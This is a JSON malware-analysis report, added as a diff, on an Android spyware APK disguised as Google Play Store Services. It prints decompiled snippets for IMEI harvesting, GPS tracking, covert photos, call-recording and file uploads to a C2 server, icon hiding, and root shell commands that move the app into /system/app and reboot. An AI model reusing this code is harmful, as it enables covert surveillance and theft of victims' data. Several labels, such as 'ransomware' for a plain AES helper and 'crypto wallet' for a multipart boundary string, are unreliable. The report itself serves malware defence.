@@ -1,0 +1,292 @@
+{
+  "APK信息": {
+    "文件名": "0918c205c6867e24080f8950ce82f48c56822187429c35cde3f37f36554bff57.apk",
+    "sha256": "0918c205c6867e24080f8950ce82f48c56822187429c35cde3f37f36554bff57",
+    "包名": "com.path.call",
+    "应用名": "Google Play Store Services",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 533.9
+  },
+  "行为列表": [
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\path\\service\\MessageSenderService;",
+          "method_signature": "onCreate()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "TelephonyManager telephonyManager = (TelephonyManager) getSystemService(\"phone\");\nthis.t = telephonyManager.getDeviceId();\ncom.android.path.receiver.e.e = String.valueOf(this.t);\ngetSharedPreferences(\"com.path.test.android.Preferences\", 1).edit().putString(com.android.path.a.a.f17a, this.t).commit();",
+          "malicious_code_snippet_context": "          try {\n              com.android.path.a.e.a(\"MessageSenderService#oncreate\");\n              F.a(this);\n>>>             TelephonyManager telephonyManager = (TelephonyManager) getSystemService(\"phone\");\n>>>             this.z = getSharedPreferences(\"com.path.test.android.Preferences\", 1).getBoolean(com.android.path.a.a.s, false);\n>>>             this.t = telephonyManager.getDeviceId();\n>>>             com.android.path.receiver.e.e = String.valueOf(this.t);\n              this.y = com.android.path.a.h.c();\n              getSharedPreferences(\"com.path.test.android.Preferences\", 1).edit().putString(com.android.path.a.a.f17a, this.t).commit();\n              this.u = new Timer();",
+          "behavior_description": "该代码位于已确认的 BondPath 间谍软件样本的 MessageSenderService.onCreate() 中，服务启动时即通过 TelephonyManager.getDeviceId() 静默采集设备 IMEI（不可变更的设备唯一标识符），随后将 IMEI 转为字符串写入静态变量 com.android.path.receiver.e.e 供其他恶意组件读取，同时持久化保存到 SharedPreferences 中。数据流向：getDeviceId()（source，采集 IMEI）→ 静态字段传递 + SharedPreferences 持久化存储（sink）。该指纹采集是间谍软件标识和追踪受害者设备、构建后续回传 C2 服务器数据的基础环节，属于恶意隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\path\\service\\GPSLogSenderService;",
+          "method_signature": "if(a()",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "boolean booleanExtra = intent.getBooleanExtra(\"honor_schedule\", true);\nif (a() && booleanExtra) { ... }\nLocation lastKnownLocation = this.t.getLastKnownLocation(\"gps\");\nif (lastKnownLocation != null) {\n    time = lastKnownLocation.getTime();\n    if (time <= System.currentTimeMillis() - 120000) {\n        lastKnownLocation = null;\n        time = 0;\n    }\n}",
+          "malicious_code_snippet_context": "          DataInputStream dataInputStream;\n          InputStream inputStream;\n          try {\n>>>             boolean booleanExtra = intent.getBooleanExtra(\"honor_schedule\", true);\n>>>             if (a() && booleanExtra) {\n>>>                 com.android.path.a.e.a(\"too early to send gps\");\n>>>                 return super.onStartCommand(intent, i, i2);\n>>>             }\n>>>             Location lastKnownLocation = this.t.getLastKnownLocation(\"gps\");\n>>>             if (lastKnownLocation != null) {\n>>>                 time = lastKnownLocation.getTime();\n>>>                 if (time <= System.currentTimeMillis() - 120000) {\n>>>                     lastKnownLocation = null;\n                      time = 0;\n                  }\n              } else {",
+          "behavior_description": "该代码位于间谍软件BondPath（伪装成Google Play Store Services）的GPSLogSenderService后台服务中。代码通过LocationManager.getLastKnownLocation(\"gps\")读取设备最近一次GPS定位，并校验该位置时间戳是否在2分钟（120000ms）内以保证数据新鲜度，过期则置空重新等待；结合服务名GPSLogSenderService及日志'too early to send gps'可知，获取的有效位置数据将被该服务上传至远程服务器，实现隐蔽、持续的用户位置追踪。数据流向：GPS位置传感器→getLastKnownLocation()读取→后台服务校验新鲜度→网络上传至远程C2服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\path\\a\\b;",
+          "method_signature": "a(byte[] bArr, int i)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SecretKeySpec secretKeySpec = new SecretKeySpec(g, \"AES\");\nCipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\ncipher.init(i, secretKeySpec);\nreturn cipher.doFinal(bArr);",
+          "malicious_code_snippet_context": "      }\n  \n      private static byte[] a(byte[] bArr, int i) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException {\n>>>         SecretKeySpec secretKeySpec = new SecretKeySpec(g, \"AES\");\n>>>         Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n>>>         cipher.init(i, secretKeySpec);\n>>>         return cipher.doFinal(bArr);\n      }\n  \n      public static byte[] b(byte[] bArr) {",
+          "behavior_description": "该类是恶意样本（BondPath家族，伪装成Google Play商店服务）内置的对称加解密引擎。代码使用硬编码在静态字段g中的密钥构造SecretKeySpec，以AES/ECB/PKCS5Padding模式初始化Cipher，对传入的字节数组bArr执行加密（i=1，Cipher.ENCRYPT_MODE）或解密（i=2，Cipher.DECRYPT_MODE）操作。数据流向：待处理数据bArr（如遍历获取的用户文件内容或窃取的隐私数据）→ 使用硬编码密钥的AES加密引擎 → cipher.doFinal()输出密文。该加密引擎位于恶意包com.android.path中而非任何合法第三方库，为样本的文件加密/数据加密行为提供核心密码学能力，可导致用户文件被加密无法访问或窃取数据被加密后回传C2服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\path\\service\\C0000a;",
+          "method_signature": "if(this.j != null)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.j = Camera.open(0);\nif (this.j != null) {\n    this.j.setPreviewDisplay(new SurfaceView(context).getHolder());\n    this.j.startPreview();\n    this.j.takePicture(null, null, this.k);\n    this.j.stopPreview();\n    this.j.release();\n}",
+          "malicious_code_snippet_context": "  \n      private void a(Context context) {\n          try {\n>>>             this.j = Camera.open(0);\n>>>         } catch (Exception e) {\n>>>             e.printStackTrace();\n>>>             com.android.path.a.e.a(\"Failed to connect to camera\\n\");\n>>>         }\n>>>         if (this.j != null) {\n>>>             try {\n>>>                 this.j.setPreviewDisplay(new SurfaceView(context).getHolder());\n                  this.j.startPreview();\n                  this.j.takePicture(null, null, this.k);\n              } catch (IOException e2) {",
+          "behavior_description": "该代码位于后台Service（com.android.path.service）中，在无任何用户界面提示的情况下静默调用设备后置摄像头：通过Camera.open(0)打开摄像头，借助临时创建的SurfaceView设置预览并启动，随即调用takePicture()完成拍照，图像数据（JPEG）通过回调对象this.k接收，最后立即stopPreview并release释放摄像头以消除使用痕迹。数据流向为：摄像头硬件→takePicture回调this.k获取图像数据→（结合BondPath间谍软件家族行为）后续上传至远程C2服务器，属于典型的间谍软件秘密拍照窃密行为，直接造成用户影像隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_recording",
+          "中文名": "通话录音",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECORD_AUDIO"
+            ],
+            "字符串": [
+              "callRecord"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\path\\service\\w;",
+          "method_signature": "if(this.b != null)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (this.b != null) {\n    this.b.b();\n    boolean zA = C0000a.a(this.b.a(), this.f61a.c, \"callrecord\");\n    if (zA) {\n        this.c.cancel();\n    }\n}",
+          "malicious_code_snippet_context": "      public final void run() {\n          try {\n              com.android.path.a.e.a(\"PhoneCallSpyListener#sendRecording\");\n>>>             if (this.b != null) {\n>>>                 this.b.b();\n>>>                 C0000a c0000a = this.b;\n>>>                 boolean zA = C0000a.a(this.b.a(), this.f61a.c, \"callrecord\");\n>>>                 com.android.path.a.e.a(\"send call record result:\" + zA);\n>>>                 if (zA) {\n>>>                     this.c.cancel();\n                  }\n              } else {\n                  com.android.path.a.e.a(\"no audio capturer->cancel task\");",
+          "behavior_description": "该代码是BondPath间谍软件的通话录音外传模块（日志标识PhoneCallSpyListener#sendRecording）。定时任务(TimerTask.run)在通话结束后停止音频捕获器(this.b.b())，通过this.b.a()获取通话录音文件，再调用C0000a.a()将录音文件以\"callrecord\"为标识上传到远程C2服务器(this.f61a.c为服务器地址)，上传成功后取消定时任务，失败则由定时器重试。数据流向：通话音频捕获(录音文件)→网络上传至远程服务器，属于典型的通话隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\path\\receiver\\c;",
+          "method_signature": "if(cursorQuery == null || !cursorQuery.moveToFirst()",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Cursor cursorQuery = context.getContentResolver().query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, null, null, \"date DESC\");\nString str = String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + \"/data\";\nFile file = new File(str);\nif (!file.exists()) { file.mkdir(); }\nString str2 = String.valueOf(str) + \"/browser-\" + com.android.path.a.h.b() + \".csv\";",
+          "malicious_code_snippet_context": "                      com.android.path.a.e.a(\"too early to send browser logs\");\n                      return;\n                  }\n>>>                 Cursor cursorQuery = context.getContentResolver().query(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, null, null, \"date DESC\");\n>>>                 if (cursorQuery == null || !cursorQuery.moveToFirst()) {\n>>>                     com.android.path.a.e.a(\"Cursor: \" + cursorQuery);\n>>>                     return;\n>>>                 }\n                  String str = String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + \"/data\";\n                  File file = new File(str);\n                  if (!file.exists()) {",
+          "behavior_description": "该代码是 BondPath 间谍软件的浏览器历史窃取模块。首先通过 SharedPreferences 中的时间戳做 24 小时（86400000ms）节流，避免频繁收集引起怀疑；随后使用 ContentResolver 查询系统浏览器的历史记录与书签数据库（Browser.BOOKMARKS_URI，按 date DESC 排序），接着在外部存储根目录创建隐藏用途的 data 目录，并将窃取的浏览记录写入 CSV 文件（browser-<时间戳>.csv），为后续回传 C2 服务器做准备。数据流向：浏览器历史数据库 → ContentResolver 查询 → 外部存储 CSV 文件落盘（待外传），属于典型的隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\path\\call\\MainActivity;",
+          "method_signature": "onCreate(Bundle bundle)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getApplicationContext().getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);",
+          "malicious_code_snippet_context": "          } catch (Exception e) {\n              com.android.path.a.e.a(e);\n          }\n>>>         getApplicationContext().getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);\n          this.u = ((TelephonyManager) getSystemService(\"phone\")).getDeviceId();\n          this.v = (Button) findViewById(R.id.buttonSave);\n          this.w = (EditText) findViewById(R.id.email);",
+          "behavior_description": "在 MainActivity.onCreate() 中，应用启动后立即调用 PackageManager.setComponentEnabledSetting()，将自身组件状态设置为 COMPONENT_ENABLED_STATE_DISABLED（参数2），并附带 DONT_KILL_APP 标志（参数1），使应用图标从桌面启动器中消失，但进程不被杀死继续在后台运行。数据流向：getComponentName()（获取应用自身主组件）→ setComponentEnabledSetting(getComponentName(), 2, 1)（禁用该组件以隐藏图标）。这是 BondPath 间谍软件家族典型的隐蔽驻留手法，配合同方法中的 getDeviceId() 收集设备IMEI和注册 SERVER_RESPONSE 广播接收器与C2通信，隐藏图标可防止用户发现并卸载该恶意应用，为后续持续窃取隐私提供掩护。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.REBOOT"
+        ],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\path\\call\\t;",
+          "method_signature": "if(a(\"chmod 777 /system/app\")",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (a(\"chmod 777 /system/app\")) {\n    zA = a(\"mv data/app/com.path.call-1.apk /system/app\");\n    a(\"chmod 755 /system/app\");\n    a(\"reboot\");\n}",
+          "malicious_code_snippet_context": "              com.android.path.a.e.a(\"SystemAppManager#makeAppSystemApp\");\n              SharedPreferences sharedPreferences = context.getSharedPreferences(\"com.path.test.android.Preferences\", 1);\n              if (!sharedPreferences.getBoolean(\"is_backup_system\", false)) {\n>>>                 if (a(\"chmod 777 /system/app\")) {\n>>>                     zA = a(\"mv data/app/com.path.call-1.apk /system/app\");\n>>>                     a(\"chmod 755 /system/app\");\n>>>                     a(\"reboot\");\n>>>                 } else {\n                      zA = false;\n                  }\n                  if (zA) {",
+          "behavior_description": "该代码是BondPath/PathCall间谍软件的持久化提权模块。恶意软件通过执行shell命令链实现自我安装为系统应用：先用 chmod 777 /system/app 修改系统应用目录权限，再将自身APK（com.path.call-1.apk）从 data/app 移动到 /system/app 目录伪装成系统应用（获得普通用户难以卸载的持久化能力），最后执行 reboot 命令静默强制重启设备，使系统应用安装生效。数据流向：硬编码的shell命令字符串（chmod/mv/reboot）→ a()方法（封装Runtime.exec执行shell命令）→ 修改系统分区权限、移动APK至系统目录、强制重启设备。重启行为是提权持久化链条的关键收尾步骤，未经用户同意静默触发。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "crypto_wallet_detection",
+      "中文名": "加密钱包地址采集",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "3R141A5J926Z5358979323Q846"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\path\\c\\a;",
+          "method_signature": "if(file.length()",
+          "malicious_behavior": "crypto_wallet_detection",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "FileInputStream fileInputStream = new FileInputStream(file);\nHttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str3).openConnection();\nhttpURLConnection.setRequestMethod(\"POST\");\nhttpURLConnection.setRequestProperty(\"Content-Type\", \"multipart/form-data;boundary=3R141A5J926Z5358979323Q846\");\nbyte[] bytes = new JSONObject(e.a(hashtable)).put(\"filename\", file.getName()).put(\"filesize\", file.length()).put(\"filemtime\", h.a(file.lastModified())).put(\"mediatype\", a(file.getAbsoluteFile())).toString().getBytes(\"UTF-8\");\ncom.android.b.d dVar = new com.android.b.d(new String(Base64.encode(com.android.path.a.b.a(bytes), 0)), e.a(bytes), str2);\ndataOutputStream.writeBytes(a(\"data\", dVar.a(), ...));\ndataOutputStream.writeBytes(a(\"hash\", dVar.b(), ...));\ndataOutputStream.writeBytes(\"Content-Disposition: form-data; name=\\\"files[mobile]\\\"; filename=\\\"\" + str + \"\\\"\");",
+          "malicious_code_snippet_context": "                      com.android.path.a.e.a(\"file will not be uploaded:\" + file.length());\n                      i = -1;\n                  } else {\n>>>                     FileInputStream fileInputStream = new FileInputStream(file);\n>>>                     try {\n>>>                         System.setProperty(\"http.keepAlive\", \"false\");\n>>>                         HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str3).openConnection();\n>>>                         try {\n>>>                             httpURLConnection.setDoInput(true);\n>>>                             httpURLConnection.setDoOutput(true);\n>>>                             httpURLConnection.setUseCaches(false);\n>>>                             httpURLConnection.setRequestMethod(\"POST\");\n                              httpURLConnection.setRequestProperty(\"Connection\", \"Close\");\n                              httpURLConnection.setRequestProperty(\"Content-Type\", \"multipart/form-data;boundary=3R141A5J926Z5358979323Q846\");\n                              ?? dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());",
+          "behavior_description": "该代码是BondPath间谍软件的文件窃取外传模块：通过FileInputStream读取设备本地文件，将文件名、文件大小、最后修改时间、媒体类型等元数据构造为JSON，经com.android.path.a.b.a()加密并Base64编码后，连同文件二进制内容一起通过HttpURLConnection以POST multipart/form-data方式静默上传到远程C2服务器（表单字段files[mobile]）。整个过程无任何用户感知与授权。数据流向：本地文件读取→加密编码→HTTP POST上传至远程服务器。结合该家族已知行为，被扫描并上传的文件可能包含加密钱包文件/钱包地址等敏感数据，属于明确的隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
